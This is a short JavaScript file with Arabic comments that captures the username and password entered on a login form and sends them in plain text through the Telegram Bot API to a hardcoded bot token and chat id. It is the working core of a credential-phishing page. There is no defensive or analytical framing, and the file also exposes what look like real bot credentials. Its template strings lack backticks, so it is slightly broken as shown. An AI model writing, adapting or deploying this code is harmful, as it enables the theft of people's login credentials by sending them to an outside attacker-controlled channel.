document.addEventListener("DOMContentLoaded", function() {
  document.getElementById("loginButton").addEventListener("click", function() {
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    // التأكد من أن الحقول غير فارغة
    if (username && password) {
      sendToTelegram(username, password);  // إرسال البيانات للبوت
    } else {
      alert("يرجى إدخال جميع الحقول.");
    }
  });
});

// وظيفة إرسال البيانات للبوت عبر API تلجرام
function sendToTelegram(username, password) {
  var botToken = "7664974744:AAG0ueJAEKAs7d8e2Yr48MifjmEBm093bV8";  // ضع توكن البوت هنا
  var chatId = "7643313499";      // ضع chat_id هنا

  // بناء الرسالة
  var message = تم تسجيل دخول جديد:\nاسم المستخدم: ${username}\nكلمة المرور: ${password};
  
  // بناء الرابط
  var url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};

  // إرسال الطلب عبر fetch
  fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        alert("تم إرسال بيانات تسجيل الدخول إلى البوت.");
      } else {
        alert("حدث خطأ في إرسال البيانات.");
      }
    })
    .catch(error => {
      console.error("Error:", error);
      alert("حدث خطأ في الاتصال مع البوت.");
    });
}
